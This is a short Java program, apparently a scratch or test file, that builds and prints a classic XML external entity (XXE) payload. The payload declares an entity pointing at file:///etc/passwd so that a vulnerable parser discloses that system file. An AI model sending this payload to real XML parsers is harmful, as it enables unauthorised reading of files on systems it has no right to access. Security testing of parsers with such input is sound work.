public class Temp3200 {
    public static void main(String[] args) {
        String doctype = "<!DOCTYPE foo [\n" +
                "<!ELEMENT foo ANY >\n" +
                "<!ENTITY xxe SYSTEM \"file:///etc/passwd\" >]>\n" +
                "<foo>&xxe;</foo>";
        System.out.println(doctype);
    }
}